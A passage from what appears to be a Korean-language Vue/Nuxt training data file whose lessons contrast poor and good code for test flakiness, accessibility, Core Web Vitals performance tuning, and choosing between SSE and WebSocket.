          why: `test.skip 으로 덮으면 커버리지가 조용히 줄고, retries 를 올리면 느려지면서 문제는 남습니다. 플래키의 원인은 거의 셋입니다. 고정 대기(02번), 데이터 공유(03번), 네트워크 타이밍 의존. --repeat-each 로 재현하고 원인별로 고칩니다.`,
          bad: String.raw`
test.skip('가끔 깨짐', async () => { ... })        // 영원히 skip
retries: 5                                          // 통과할 때까지
test.fixme('나중에')                                // 나중은 오지 않는다
`,
          good: String.raw`
# 재현: 10번 돌려 1번이라도 실패하면 플래키
npx playwright test signup --repeat-each 10 --workers 4

# trace 로 원인 확인 → 분류
#  1) 대기 문제: textContent() 한 번 읽기, waitForTimeout → expect 재시도로
#  2) 데이터 공유: 같은 이메일·같은 상품 → Date.now() 고유값, API 로 생성
#  3) 타이밍: 응답 순서 가정 → waitForResponse 로 특정 요청을 기다리거나, 결과 상태로 검증

# 리포트의 flaky 목록(재시도로 통과) 을 주 1회 비운다. 원인 못 찾으면 skip 대신 test.fail 로 "알려진 실패" 표시 + 이슈 링크
`,
        },
      ],
    },
    {
      id: 'vue-22', no: 22, name: `접근성 (a11y) 점검`,
      lead: `키보드와 스크린리더로도 쓸 수 있는 화면을 만드는 습관입니다. 대부분은 올바른 HTML 요소를 쓰는 것으로 끝나고, Vue 에서 특히 신경 쓸 곳은 포커스 관리와 동적 알림입니다.`,
      lessons: [
        {
          id: 'l1', short: `시맨틱 요소`,
          title: `클릭되는 것은 button, 이동하는 것은 a. div 에 @click 을 달지 않는다`,
          why: `div 는 키보드로 포커스되지 않고 Enter·Space 로 눌리지 않으며 스크린리더가 "버튼" 이라고 읽지 않습니다. button 과 a 는 이걸 공짜로 줍니다. 스타일이 문제면 CSS 로 초기화합니다.`,
          bad: String.raw`
<div class="btn" @click="save">저장</div>
<span class="link" @click="router.push('/orders')">주문 내역</span>
<div class="card" @click="open(item)">...</div>
`,
          good: String.raw`
<button type="button" class="btn" @click="save">저장</button>
<NuxtLink to="/orders" class="link">주문 내역</NuxtLink>

<!-- 카드 전체 클릭: 안에 진짜 링크를 두고 CSS 로 영역을 넓힌다 -->
<article class="card">
  <h3><NuxtLink :to="'/items/' + item.id" class="stretched">{{ item.name }}</NuxtLink></h3>
</article>
<style>.card { position: relative } .stretched::after { content: ''; position: absolute; inset: 0 }</style>
`,
          note: `정말 div 를 써야 한다면 <code>role="button" tabindex="0" @keydown.enter @keydown.space.prevent</code> 를 전부 붙여야 합니다. 그럴 바엔 button 이 낫습니다.`,
        },
        {
          id: 'l2', short: `라벨`,
          title: `모든 입력에는 연결된 label 이 있다. placeholder 는 라벨이 아니다`,
          why: `placeholder 는 입력하면 사라지고 스크린리더가 라벨로 읽지 않는 경우가 많습니다. label for / id 로 연결하면 라벨 클릭으로 포커스도 되고, E2E 의 getByLabel 도 동작합니다. 아이콘만 있는 입력은 aria-label.`,
          bad: String.raw`
<input v-model="email" placeholder="이메일">
<div>비밀번호</div><input v-model="pw" type="password">   <!-- 연결 안 됨 -->
<input type="search" placeholder="검색">
`,
          good: String.raw`
<script setup lang="ts">
const id = useId()                      <!-- 3.5+: SSR 에서도 안정적인 고유 id -->
</script>
<label :for="id">이메일</label>
<input :id="id" v-model="email" type="email" autocomplete="email">

<!-- 라벨을 시각적으로 숨길 때도 DOM 에는 둔다 -->
<label :for="id + '-q'" class="sr-only">검색</label>
<input :id="id + '-q'" type="search" placeholder="상품명, 브랜드">

<!-- 컴포넌트로 감싸면 label/id 연결을 컴포넌트가 책임진다 -->
<FormField label="비밀번호" v-slot="{ id }"><input :id="id" type="password" autocomplete="current-password"></FormField>
`,
        },
        {
          id: 'l3', short: `아이콘 버튼`,
          title: `아이콘만 있는 버튼에는 aria-label, 장식 아이콘에는 aria-hidden`,
          why: `× 버튼, 종 아이콘, 햄버거 메뉴는 스크린리더에 "버튼" 으로만 읽힙니다. 무슨 버튼인지 aria-label 로 알려 줍니다. 텍스트 옆의 장식 아이콘은 읽히지 않게 숨깁니다. SVG 안의 title 은 브라우저마다 다르게 읽혀 믿을 수 없습니다.`,
          bad: String.raw`
<button @click="close"><IconX /></button>
<button @click="toggleMenu"><svg>...</svg></button>
<button><IconTrash /> 삭제</button>       <!-- "삭제 삭제" 또는 아이콘 이름이 읽힐 수 있다 -->
`,
          good: String.raw`
<button type="button" aria-label="닫기" @click="close"><IconX aria-hidden="true" /></button>
<button type="button" aria-label="메뉴 열기" :aria-expanded="open" @click="toggleMenu"><IconMenu aria-hidden="true" /></button>
<button type="button"><IconTrash aria-hidden="true" /> 삭제</button>

<!-- 상태가 바뀌는 버튼은 라벨도 바뀐다 -->
<button type="button" :aria-label="liked ? '좋아요 취소' : '좋아요'" :aria-pressed="liked" @click="toggle">
  <IconHeart aria-hidden="true" :filled="liked" />
</button>
`,
          note: `아이콘 컴포넌트는 기본으로 <code>aria-hidden="true" focusable="false"</code> 를 갖게 만들어 두면 매번 안 붙여도 됩니다.`,
        },
        {
          id: 'l4', short: `포커스 관리`,
          title: `모달을 열면 안으로, 닫으면 열었던 버튼으로 포커스를 보낸다`,
          why: `모달이 열렸는데 포커스가 뒤에 남아 있으면 키보드 사용자는 모달을 찾지 못하고, 닫혔는데 포커스가 body 로 가면 처음부터 다시 탭해야 합니다. 포커스 가두기(trap) 와 복귀는 모달 컴포넌트가 책임집니다.`,
          bad: String.raw`
<div v-if="open" class="modal">
  <h2>리뷰 쓰기</h2>
  <textarea v-model="text" />
  <button @click="open = false">닫기</button>
</div>
<!-- 포커스는 여전히 "리뷰 쓰기" 버튼 뒤의 어딘가. Tab 하면 모달 뒤 페이지를 돈다 -->
`,
          good: String.raw`
<script setup lang="ts">
import { useFocusTrap } from '@vueuse/integrations/useFocusTrap'
const open = defineModel<boolean>()
const panel = useTemplateRef('panel')
const { activate, deactivate } = useFocusTrap(panel, { immediate: false, escapeDeactivates: false })
let opener: HTMLElement | null = null
watch(open, async (v) => {
  if (v) { opener = document.activeElement as HTMLElement; await nextTick(); activate(); panel.value?.querySelector<HTMLElement>('[autofocus], input, textarea, button')?.focus() }
  else { deactivate(); opener?.focus() }                       // 열었던 버튼으로 복귀
})
</script>
<template>
  <Teleport to="body">
    <div v-if="open" ref="panel" role="dialog" aria-modal="true" :aria-labelledby="titleId" @keydown.esc="open = false">
      <h2 :id="titleId">리뷰 쓰기</h2>
      <textarea autofocus />
      <button type="button" @click="open = false">닫기</button>
    </div>
  </Teleport>
</template>
`,
          note: `네이티브 <code>&lt;dialog&gt;</code> 요소의 <code>showModal()</code> 은 포커스 가두기와 Esc 를 브라우저가 해 줍니다. 복귀 포커스만 챙기면 됩니다.`,
        },
        {
          id: 'l5', short: `라우트 전환`,
          title: `SPA 페이지 이동 후에는 제목을 바꾸고 포커스를 본문 시작으로 옮긴다`,
          why: `전체 새로고침과 달리 SPA 이동은 스크린리더에게 아무 일도 안 일어난 것처럼 보입니다. 포커스는 눌렀던 링크에 남고, 페이지 제목도 그대로일 수 있습니다. 제목 갱신 + 본문 h1 으로 포커스 이동 + 알림 한 줄이면 됩니다.`,
          bad: String.raw`
// NuxtLink 만 쓰고 끝. 포커스는 헤더의 링크에 남아 있고 document.title 은 안 바뀐다
`,
          good: String.raw`
// plugins/route-announcer.client.ts
export default defineNuxtPlugin((nuxtApp) => {
  const router = useRouter()
  router.afterEach((to) => {
    nextTick(() => {
      const h1 = document.querySelector<HTMLElement>('main h1')
      if (h1) { h1.tabIndex = -1; h1.focus({ preventScroll: false }) }   // 본문 시작으로
      else document.getElementById('main')?.focus()
      announce((document.title || to.path) + ' 페이지로 이동했습니다')       // 08번 aria-live
    })
  })
})
// 각 페이지는 useHead({ title }) 또는 useSeoMeta 로 제목을 바꾼다. Nuxt 의 <NuxtRouteAnnouncer /> 를 app.vue 에 두면 알림 부분은 자동
// layouts: <a href="#main" class="skip-link">본문으로 건너뛰기</a> + <main id="main" tabindex="-1">
`,
        },
        {
          id: 'l6', short: `색과 대비`,
          title: `상태를 색으로만 표현하지 않고, 대비는 4.5:1 을 지킨다`,
          why: `빨간 테두리만으로 오류를 알리면 색각 이상 사용자와 스크린리더는 모릅니다. 아이콘이나 텍스트를 같이 둡니다. 회색 placeholder·보조 텍스트는 대비가 쉽게 3:1 아래로 떨어집니다. 디자인 토큰 단계에서 검사해 두면 페이지마다 안 봐도 됩니다.`,
          bad: String.raw`
<input :class="{ error: invalid }">              <!-- 빨간 테두리만 -->
<span :style="{ color: ok ? 'green' : 'red' }">●</span>   <!-- 점 색만 -->
<p style="color: #bbb">보조 설명</p>              <!-- 흰 배경에 2.1:1 -->
`,
          good: String.raw`
<input :class="{ error: invalid }" :aria-invalid="invalid" :aria-describedby="invalid ? errId : undefined">
<p v-if="invalid" :id="errId" class="error-text"><IconAlert aria-hidden="true" /> 이메일 형식이 아닙니다</p>

<span class="status" :class="ok ? 'ok' : 'fail'"><IconCheck v-if="ok" aria-hidden="true" /><IconX v-else aria-hidden="true" /> {{ ok ? '정상' : '실패' }}</span>

<p class="text-muted">보조 설명</p>   <!-- --text-muted: #6b7280 (4.6:1) 처럼 토큰에서 보장 -->

// 토큰 검사 (테스트에서): import { hex } from 'wcag-contrast'; expect(hex('#6b7280', '#ffffff')).toBeGreaterThan(4.5)
`,
        },
        {
          id: 'l7', short: `이미지 alt`,
          title: `내용 이미지는 설명하는 alt, 장식 이미지는 alt=""`,
          why: `alt 가 없으면 스크린리더가 파일명을 읽고, "이미지" 라고만 쓰면 아무 정보가 없습니다. 상품 사진은 상품명, 그래프는 결론, 장식은 빈 alt 로 건너뛰게 합니다. 링크 안의 이미지는 링크 목적지를 설명합니다.`,
          bad: String.raw`
<img :src="product.image">                         <!-- alt 없음: "IMG_2031.jpg" 를 읽는다 -->
<img :src="product.image" alt="이미지">
<img src="/divider.png" alt="구분선 장식 이미지">   <!-- 읽을 필요 없는 걸 읽는다 -->
<a :href="link"><img src="/logo.png"></a>           <!-- 링크 이름이 없다 -->
`,
          good: String.raw`
<NuxtImg :src="product.image" :alt="product.name + ' 상품 사진'" />
<img src="/divider.png" alt="" role="presentation">
<a href="/"><img src="/logo.png" alt="파인마켓 홈"></a>

<!-- 차트: 결론을 텍스트로 -->
<figure>
  <EChart :option="option" aria-hidden="true" />
  <figcaption class="sr-only">지난 30일 매출 추이. 총 1,250만원, 전월 대비 12% 증가</figcaption>
</figure>
<!-- 사용자 업로드 이미지: alt 입력란을 두거나 "사용자가 올린 이미지" + 캡션 -->
`,
        },
        {
          id: 'l8', short: `동적 알림`,
          title: `토스트·로딩·결과 수 같은 동적 변화는 aria-live 로 읽히게 한다`,
          why: `화면 구석에 토스트가 떠도 스크린리더는 모릅니다. aria-live 영역에 텍스트를 넣으면 포커스를 옮기지 않고도 읽어 줍니다. 영역은 미리 DOM 에 있어야 하고(동적으로 만들면 첫 알림을 놓침), 긴급도에 따라 polite/assertive 를 고릅니다.`,
          bad: String.raw`
<Toast v-if="msg">{{ msg }}</Toast>      <!-- v-if 로 생겼다 사라지는 영역: 안 읽힐 수 있다 -->
<p v-if="loading">불러오는 중</p>
`,
          good: String.raw`
<!-- app.vue: 항상 DOM 에 있는 알림 영역 -->
<div id="announcer" class="sr-only" aria-live="polite" aria-atomic="true"></div>
<div id="announcer-urgent" class="sr-only" aria-live="assertive" aria-atomic="true"></div>

// utils/announce.ts
export function announce(text: string, urgent = false) {
  const el = document.getElementById(urgent ? 'announcer-urgent' : 'announcer'); if (!el) return
  el.textContent = ''; setTimeout(() => (el.textContent = text), 50)    // 같은 문장 반복도 읽히게 비웠다 넣는다
}
// 토스트 스토어 push 에서 announce(message, type === 'error')

<!-- 결과 수·로딩은 영역 자체에 -->
<p role="status" aria-live="polite">{{ loading ? '불러오는 중' : total + '건' }}</p>
<button :aria-busy="saving">{{ saving ? '저장 중…' : '저장' }}</button>
`,
        },
        {
          id: 'l9', short: `폼 오류 연결`,
          title: `오류 메시지는 입력과 aria-describedby 로 묶고, 제출 실패 시 첫 오류로 포커스`,
          why: `오류 문구가 입력 아래에 보여도 스크린리더는 입력에 포커스했을 때 그 문구를 모릅니다. describedby 로 묶으면 입력을 읽을 때 같이 읽힙니다. 제출 후 오류가 있으면 첫 오류 입력으로 포커스를 보내야 위에서부터 다시 찾지 않습니다.`,
          bad: String.raw`
<input v-model="email">
<p v-if="errors.email" class="error">{{ errors.email }}</p>
<button @click="submit">가입</button>    <!-- 실패해도 포커스는 버튼에 -->
`,
          good: String.raw`
<input :id="id" v-model="email" :aria-invalid="!!errors.email" :aria-describedby="errors.email ? id + '-err' : id + '-help'" aria-required="true">
<p :id="id + '-help'" class="help">회사 이메일을 권장합니다</p>
<p v-if="errors.email" :id="id + '-err'" class="error" role="alert">{{ errors.email }}</p>

<script setup lang="ts">
const onSubmit = handleSubmit(save, ({ errors }) => {
  const first = Object.keys(errors)[0]
  document.querySelector<HTMLElement>('[name="' + first + '"], #' + first)?.focus()   // 첫 오류로
  announce('입력 오류가 ' + Object.keys(errors).length + '건 있습니다', true)
})
</script>
<!-- 폼 상단 요약도 좋다: <ul role="alert"><li v-for="(m, k) in errors"><a :href="'#' + k">{{ m }}</a></li></ul> -->
`,
        },
        {
          id: 'l10', short: `모션과 자동 검사`,
          title: `prefers-reduced-motion 을 존중하고, axe 를 CI 에 넣는다`,
          why: `큰 움직임은 전정기관 장애가 있는 사용자에게 어지럼을 줍니다. 미디어 쿼리 하나로 애니메이션을 줄일 수 있습니다. 그리고 라벨 누락·대비·중복 id 같은 기계적 위반은 사람이 매번 못 보니 axe 로 자동 검사합니다(실무 코드 20회차 08번).`,
          bad: String.raw`
.page-enter-active { transition: transform .6s cubic-bezier(.2,.8,.2,1) }   /* 모두에게 큰 슬라이드 */
// 접근성 점검: "출시 전에 한 번 보자" → 보지 않는다
`,
          good: String.raw`
/* 전역 한 줄: 움직임 줄이기 설정이면 전부 짧게 */
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { animation-duration: .01ms !important; transition-duration: .01ms !important; scroll-behavior: auto !important; }
}
// JS 애니메이션(GSAP, motion) 도: const reduce = usePreferredReducedMotion() (VueUse) → reduce.value === 'reduce' 면 건너뛴다

// e2e/a11y.spec.ts: 주요 페이지 6개에 AxeBuilder, critical·serious 위반이면 실패
// ESLint: eslint-plugin-vuejs-accessibility — alt 누락, label 누락, click 에 keydown 없음 등을 편집기에서
// 수동 점검 루틴 (분기 1회): 마우스 없이 Tab 만으로 주요 흐름 완주, VoiceOver/NVDA 로 한 바퀴
`,
        },
      ],
    },
    {
      id: 'vue-23', no: 23, name: `성능 측정과 Core Web Vitals`,
      lead: `LCP·CLS·INP 세 지표를 좋게 유지하는 습관입니다. 이미지와 폰트, 레이아웃 예약, 긴 작업 쪼개기, 서드파티, 하이드레이션 비용, 번들, 캐시, 그리고 "실제 사용자" 측정까지.`,
      lessons: [
        {
          id: 'l1', short: `LCP 이미지`,
          title: `첫 화면의 큰 이미지는 lazy 를 빼고 우선순위를 올린다`,
          why: `LCP(가장 큰 콘텐츠가 그려지는 시점) 는 대부분 히어로 이미지입니다. 모든 이미지에 loading="lazy" 를 붙이면 그 이미지도 늦게 시작합니다. 첫 화면의 LCP 후보에는 fetchpriority="high" 와 preload 를, 나머지에만 lazy 를.`,
          bad: String.raw`
<NuxtImg v-for="b in banners" :src="b.src" loading="lazy" />   <!-- 첫 배너까지 lazy -->
<img :src="hero" loading="lazy">
`,
          good: String.raw`
<!-- 첫 화면 LCP 후보: lazy 금지, 우선순위 높임, 미리 로드 -->
<NuxtImg :src="hero" width="1200" height="600" sizes="100vw sm:100vw md:1200px" preload fetchpriority="high" />

<!-- 그 아래부터만 lazy -->
<NuxtImg v-for="(b, i) in banners" :key="b.id" :src="b.src" :loading="i === 0 ? 'eager' : 'lazy'" :fetchpriority="i === 0 ? 'high' : 'auto'" />

<!-- 배경 이미지로 LCP 가 되는 경우는 preload 링크를 직접 -->
useHead({ link: [{ rel: 'preload', as: 'image', href: '/hero.webp', fetchpriority: 'high' }] })
`,
          note: `무엇이 LCP 요소인지는 DevTools Performance 패널의 LCP 마커나 web-vitals 의 <code>attribution.element</code> 로 확인합니다. 짐작하지 말고 확인합니다.`,
        },
        {
          id: 'l2', short: `반응형 이미지`,
          title: `sizes 와 포맷을 지정해 화면에 맞는 크기만 받는다`,
          why: `원본 3000px 이미지를 모바일 360px 화면에 내려보내면 LCP 가 늦고 데이터가 낭비됩니다. NuxtImg 가 srcset 을 만들어 주지만 sizes 가 없으면 브라우저가 큰 걸 고릅니다. 포맷은 webp/avif 로 자동 변환합니다.`,
          bad: String.raw`
<img :src="product.image">                    <!-- 원본 그대로 -->
<NuxtImg :src="product.image" />              <!-- sizes 없음: 100vw 로 가정 -->
`,
          good: String.raw`
<NuxtImg
  :src="product.image" :alt="product.name"
  width="400" height="400"                       <!-- 비율 예약 (03번 CLS) -->
  sizes="(max-width: 640px) 50vw, 300px"         <!-- 실제 렌더 폭 -->
  format="webp" quality="80"
  loading="lazy" placeholder
/>
<!-- nuxt.config: image: { provider: 'ipx' | 'cloudinary' | 'vercel', screens: {...}, domains: ['cdn.example.com'] } -->
<!-- 결과: srcset="…-200.webp 200w, …-400.webp 400w, …-600.webp 600w" 에서 화면 폭·DPR 에 맞는 것 하나만 받는다 -->
`,
        },
        {
          id: 'l3', short: `레이아웃 예약`,
          title: `이미지·광고·동적 영역은 크기를 미리 잡아 밀림(CLS)을 막는다`,
          why: `이미지가 로드되며 아래 내용이 내려가고, 배너가 늦게 끼어들어 버튼이 밀리면 사용자가 잘못 누릅니다. width/height 또는 aspect-ratio 로 자리를 예약하고, 동적 영역은 최소 높이를 둡니다. 스켈레톤도 실제 높이와 같아야 합니다.`,
          bad: String.raw`
<img :src="src">                              <!-- 로드 후 높이가 생긴다 -->
<div v-if="banner"><Banner /></div>           <!-- 늦게 나타나 아래를 민다 -->
<div v-if="loading">로딩…</div><List v-else /> <!-- 한 줄 → 20줄로 점프 -->
`,
          good: String.raw`
<img :src="src" width="800" height="450">                  <!-- 브라우저가 비율로 자리를 잡는다 -->
<div class="banner-slot"><Banner v-if="banner" /></div>    <!-- .banner-slot { min-height: 120px } -->
<ListSkeleton v-if="loading" :rows="10" />                  <!-- 실제 행 높이와 같은 스켈레톤 -->
<List v-else />

<style>
.thumb { aspect-ratio: 1 / 1; width: 100% }               /* CSS 로 예약해도 된다 */
.ad { min-height: 250px; contain: layout }                 /* 서드파티 광고는 고정 높이 */
</style>
<!-- 폰트 교체로 글자 폭이 바뀌며 생기는 CLS 는 04번 -->
`,
        },
        {
          id: 'l4', short: `폰트`,
          title: `웹폰트는 preload + display: swap, 폴백 폰트 크기를 맞춘다`,
          why: `폰트가 늦으면 글자가 안 보이거나(FOIT) 바뀌며 레이아웃이 튑니다(CLS). preload 로 빨리 받고 swap 으로 먼저 보여 주되, size-adjust 로 폴백과 폭을 맞추면 교체 시 밀림이 거의 없습니다. 구글 폰트 링크는 요청 체인이 깁니다.`,
          bad: String.raw`
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;700" rel="stylesheet">
<!-- CSS 받고 → 폰트 URL 알고 → 폰트 받음: 3단계. 그동안 글자가 안 보인다 -->
`,
          good: String.raw`
// nuxt.config.ts — @nuxt/fonts 가 로컬로 받아 self-host + preload + fallback 조정까지
export default defineNuxtConfig({ modules: ['@nuxt/fonts'], fonts: { families: [{ name: 'Pretendard', provider: 'local', weights: [400, 700] }] } })

/* 직접 할 때 */
@font-face { font-family: 'Pretendard'; src: url('/fonts/Pretendard-Regular.woff2') format('woff2'); font-weight: 400; font-display: swap; unicode-range: U+AC00-D7A3, U+0020-007E; }
@font-face { font-family: 'Pretendard Fallback'; src: local('Apple SD Gothic Neo'), local('Malgun Gothic'); size-adjust: 102%; ascent-override: 92%; }   /* 폭 맞춘 폴백 */
body { font-family: 'Pretendard', 'Pretendard Fallback', sans-serif; }

useHead({ link: [{ rel: 'preload', as: 'font', type: 'font/woff2', href: '/fonts/Pretendard-Regular.woff2', crossorigin: 'anonymous' }] })
// 한글 폰트는 2~3MB: 서브셋(unicode-range 분할, 자주 쓰는 2,350자) 으로 300KB 이하로
`,
        },
        {
          id: 'l5', short: `긴 작업 쪼개기`,
          title: `50ms 넘는 JS 작업은 입력 반응(INP)을 막는다. 나눠서 양보한다`,
          why: `클릭 뒤 200ms 안에 화면이 반응해야 합니다. 큰 배열 가공, 큰 목록 렌더, 무거운 computed 가 메인 스레드를 잡고 있으면 그 사이 입력은 멈춥니다. 작업을 쪼개 브라우저에 양보하거나, 워커로 보내거나, 렌더를 지연합니다.`,
          bad: String.raw`
function onSearch(q: string) {
  results.value = ALL_ITEMS.filter(...).map(heavyTransform).sort(...)   // 50,000개 × 동기: 300ms 동안 멈춤
}
<input @input="onSearch($event.target.value)">
`,
          good: String.raw`
// 1) 입력 디바운스 + 결과는 다음 프레임에
const onSearch = useDebounceFn((q: string) => { startTransition(() => compute(q)) }, 150)

// 2) 큰 작업은 조각내어 양보 (scheduler.yield 또는 setTimeout 0)
async function compute(q: string) {
  const out: Item[] = []
  for (let i = 0; i < ALL_ITEMS.length; i += 2000) {
    out.push(...ALL_ITEMS.slice(i, i + 2000).filter(match(q)))
    await yieldToMain()                                  // const yieldToMain = () => 'scheduler' in window ? scheduler.yield() : new Promise(r => setTimeout(r))
  }
  results.value = out
}

// 3) 정말 무거우면 워커 (실무 코드 10회차 08번): const worker = new Worker(new URL('./search.worker.ts', import.meta.url))
// 4) 렌더 비용이 문제면: 가상 스크롤(26회차), v-memo, shallowRef 로 반응성 비용 제거
`,
        },
        {
          id: 'l6', short: `서드파티`,
          title: `분석·채팅·광고 스크립트는 상호작용 뒤나 유휴 시간에 로드한다`,
          why: `GTM, 채팅 위젯, 광고 하나가 메인 스레드 500ms 를 먹는 일이 흔합니다. 첫 화면에 필요 없는 스크립트는 사용자가 움직이거나 브라우저가 한가할 때 로드합니다. @nuxt/scripts 가 이런 전략을 제공합니다.`,
          bad: String.raw`
useHead({ script: [
  { src: 'https://www.googletagmanager.com/gtm.js?id=GTM-XXXX' },
  { src: 'https://widget.channel.io/sdk.js' },
  { src: 'https://pagead2.googlesyndication.com/...' }
] })   // 전부 head 에서 즉시
`,
          good: String.raw`
// nuxt.config.ts: modules: ['@nuxt/scripts']
// 분석: 유휴 시간에
useScriptGoogleTagManager({ id: 'GTM-XXXX', scriptOptions: { trigger: 'onNuxtReady' } })

// 채팅 위젯: 사용자가 스크롤·클릭하거나 10초 지나면
const { onLoaded } = useScript('https://widget.channel.io/sdk.js', { trigger: useScriptTriggerInteraction({ timeout: 10_000 }) })

// 지도·결제 SDK: 그 컴포넌트가 보일 때 (실무 코드 17회차 01번 loadScript)
// 유튜브·소셜 임베드: 썸네일(정적 이미지) 먼저, 클릭 시 iframe — <ScriptYouTubePlayer> 가 이 패턴
// 측정: DevTools Performance 의 "Third-party" 체크박스로 누가 먹는지 본다
`,
        },
        {
          id: 'l7', short: `하이드레이션 비용`,
          title: `보이지 않거나 상호작용 없는 부분은 늦게 또는 아예 하이드레이션하지 않는다`,
          why: `SSR HTML 이 빨리 와도 JS 가 전체 컴포넌트 트리를 다시 만들어야 클릭이 됩니다(TTI·INP). 화면 밖 섹션은 보일 때, 정적인 섹션은 아예 서버 컴포넌트로 두면 첫 화면 JS 가 크게 줍니다.`,
          bad: String.raw`
<template>
  <Hero /><ProductGrid /><Reviews :items="reviews" /><Footer />
  <!-- 전부 즉시 하이드레이션. 리뷰 200개 컴포넌트가 화면 밖에서 JS 를 먹는다 -->
</template>
`,
          good: String.raw`
<template>
  <Hero />
  <ProductGrid />
  <LazyReviews hydrate-on-visible :items="reviews" />              <!-- 3.5 지연 하이드레이션: 보일 때 -->
  <LazyNewsletter hydrate-on-idle />                                <!-- 브라우저 유휴 시 -->
  <LazyChatButton hydrate-on-interaction="click" />                 <!-- 누를 때 -->
  <Footer />                                                        <!-- 상호작용 없는 정적 부분: Footer.server.vue 로 만들면 JS 0 -->
</template>
<!-- 서버 컴포넌트 (Nuxt islands): nuxt.config experimental.componentIslands = true, 파일명 *.server.vue. 안에서 ref/onMounted 는 못 쓴다 -->
<!-- 확인: nuxi analyze 로 클라이언트 번들, DevTools Performance 의 hydrate 구간 길이 -->
`,
        },
        {
          id: 'l8', short: `번들`,
          title: `무거운 라이브러리는 쓰는 페이지에서만, 쓰는 부분만 가져온다`,
          why: `날짜 라이브러리 전체, 차트 전체, 아이콘 세트 전체를 app 번들에 넣으면 모든 페이지가 느려집니다. 동적 import 로 라우트별 청크에 두고, 트리셰이킹되는 모듈별 import 를 씁니다. 번들 분석을 정기적으로 봅니다.`,
          bad: String.raw`
import * as echarts from 'echarts'                   // 1MB
import moment from 'moment'                          // 로케일 전부
import { Icon } from '@iconify/vue'                  // 런타임 아이콘 로드는 괜찮지만 아이콘 세트 전체 import 는 아니다
import _ from 'lodash'
`,
          good: String.raw`
import * as echarts from 'echarts/core'; import { LineChart } from 'echarts/charts'   // 부품만 (실무 코드 13회차 01번)
import { format } from 'date-fns'                   // 함수별
import debounce from 'lodash-es/debounce'           // ESM 개별

// 무거운 컴포넌트는 쓰는 곳에서 비동기로
const Editor = defineAsyncComponent(() => import('~/components/editor/RichEditor.vue'))

# 정기 점검
npx nuxi analyze            # 클라이언트 번들 트리맵: 큰 덩어리가 무엇인지
# nuxt.config: vite.build.rollupOptions.output.manualChunks 는 보통 불필요. Nuxt 가 라우트별로 나눈다
# 목표: 첫 페이지 JS gz 150~200KB 이하. 넘으면 07·08번부터
`,
        },
        {
          id: 'l9', short: `캐시와 SWR`,
          title: `자주 안 바뀌는 페이지는 routeRules 로 캐시하고, 정적 자산은 1년 캐시`,
          why: `SSR 은 요청마다 렌더링합니다. 상품 상세처럼 자주 안 바뀌는 페이지는 swr 로 캐시해 두면 TTFB 가 수백 ms 에서 수 ms 로 줍니다. _nuxt 의 해시 파일은 immutable 로 두면 재방문이 빠릅니다. 개인화된 페이지는 캐시하면 안 됩니다.`,
          bad: String.raw`
// routeRules 없음: 상품 상세 1만 뷰 = SSR 1만 번 + DB 쿼리 1만 번
// 정적 자산에 Cache-Control 없음: 재방문도 전부 다시 받는다
`,
          good: String.raw`
// nuxt.config.ts
routeRules: {
  '/': { swr: 60 },                                   // 60초 캐시, 그 뒤 백그라운드 재생성
  '/products/**': { swr: 600 },
  '/blog/**': { isr: 3600 },                          // Vercel/Netlify 류에서 플랫폼 캐시
  '/about': { prerender: true },
  '/me/**': { ssr: false },                           // 개인 페이지: 캐시 없음 + 클라이언트 렌더
  '/_nuxt/**': { headers: { 'cache-control': 'public, max-age=31536000, immutable' } },
  '/api/products/**': { cache: { maxAge: 60 } }
}
// 주의: swr 페이지에 로그인 사용자 이름을 SSR 로 박으면 다른 사람에게 보인다 → 그 부분은 <ClientOnly> 또는 클라이언트 fetch
`,
        },
        {
          id: 'l10', short: `실제 사용자 측정`,
          title: `Lighthouse 점수가 아니라 실제 사용자의 p75 를 보고 고친다`,
          why: `Lighthouse 는 한 환경의 한 번 측정입니다. 실제 사용자는 느린 폰과 3G 에 있습니다. web-vitals 로 LCP·CLS·INP 와 "어느 요소 때문인지" 를 수집해 페이지별 p75 를 보면 무엇을 먼저 고칠지 정해집니다.`,
          bad: String.raw`
// 출시 전 Lighthouse 95점 확인 → 끝
// 사용자 불만: "모바일에서 버튼이 안 눌려요" (INP 800ms) 를 아무도 못 본다
`,
          good: String.raw`
// plugins/vitals.client.ts
import { onLCP, onCLS, onINP } from 'web-vitals/attribution'
export default defineNuxtPlugin(() => {
  const send = (m: any) => navigator.sendBeacon('/api/vitals', JSON.stringify({
    name: m.name, value: m.value, rating: m.rating, path: location.pathname,
    element: m.attribution?.element ?? m.attribution?.largestShiftTarget ?? m.attribution?.interactionTarget,   // 범인 요소
    connection: (navigator as any).connection?.effectiveType, device: /Mobi/.test(navigator.userAgent) ? 'mobile' : 'desktop'
  }))
  onLCP(send); onCLS(send); onINP(send)
})
// 서버: 적재 → 페이지·기기별 p75 대시보드 (실무 코드 13회차). 목표 p75: LCP < 2.5s, INP < 200ms, CLS < 0.1
// Search Console 의 Core Web Vitals 리포트와 CrUX 도 같은 데이터 (28일 롤링)
// 회귀 방지: Lighthouse CI (lhci) 를 PR 에 — 점수가 아니라 "LCP 가 300ms 이상 나빠지면 실패" 식의 예산으로
`,
        },
      ],
    },
    {
      id: 'vue-24', no: 24, name: `실시간 (WebSocket, SSE)`,
      lead: `서버가 밀어 주는 데이터를 다루는 습관입니다. 무엇을 쓸지 고르고, 끊김과 재연결을 전제로 설계하고, 연결은 하나만 두고, 메시지는 타입으로 판별하고, 재연결 뒤 상태를 맞추는 것까지.`,
      lessons: [
        {
          id: 'l1', short: `선택`,
          title: `서버 → 클라이언트 한 방향이면 SSE, 양방향·고빈도면 WebSocket`,
          why: `알림·진행률·가격 갱신은 서버가 보내기만 합니다. SSE 는 HTTP 라 프록시·인증·재연결이 공짜이고 구현이 짧습니다. 채팅·게임·협업처럼 클라이언트도 자주 보내면 WebSocket. 폴링은 10초 이상 간격이면 여전히 괜찮은 선택입니다.`,
          bad: String.raw`
// 알림 배지 하나 때문에 WebSocket 서버 + 인증 핸드셰이크 + 재연결 로직을 전부 만든다
// 또는 반대로, 채팅을 1초 폴링으로
`,
          good: String.raw`
// 상황 → 선택
// 알림, 진행률, 대시보드 갱신, 가격 틱   → SSE (EventSource). 자동 재연결, Last-Event-ID 로 이어 받기
// 채팅, 커서 공유, 게임, 협업 편집       → WebSocket
// 10초~1분 간격이면 충분한 것           → 폴링 (useIntervalFn + 탭 보일 때만). 가장 단순하고 캐시·CDN 과 잘 맞는다

// Nitro: server/api/notifications/stream.get.ts 에서 createEventStream(event) 으로 SSE
